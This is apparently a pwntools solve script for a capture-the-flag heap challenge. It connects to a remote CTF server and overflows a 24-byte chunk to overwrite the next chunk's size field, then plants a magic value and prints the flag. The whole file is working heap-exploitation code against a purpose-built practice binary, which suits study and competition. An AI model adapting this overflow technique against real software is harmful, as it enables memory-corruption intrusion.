from pwn import *
from time import sleep

context.binary = binary = ELF('./the_heap_of_the_brave', checksec=False)

#p = process()
p = remote('heap.ctf.prgy.in', 1337, ssl=True)

for _ in range(3):
	p.sendline(b'1')
	p.sendline(b'24')

p.clean()

p.sendline(b'3')
p.sendline(b'0')
p.sendline(b'A' * 24 + p64(0x41))

p.sendline(b'3')
p.sendline(b'2')
p.sendline(p64(0xdeadbeefcafebabe))

sleep(1)

p.sendline(b'2')
p.sendline(b'1')

p.sendline(b'4')

p.recvuntil(b'The gates of Valhalla open for you:\n')
success(f'Flag: {p.recvrepeat().decode().strip()}')
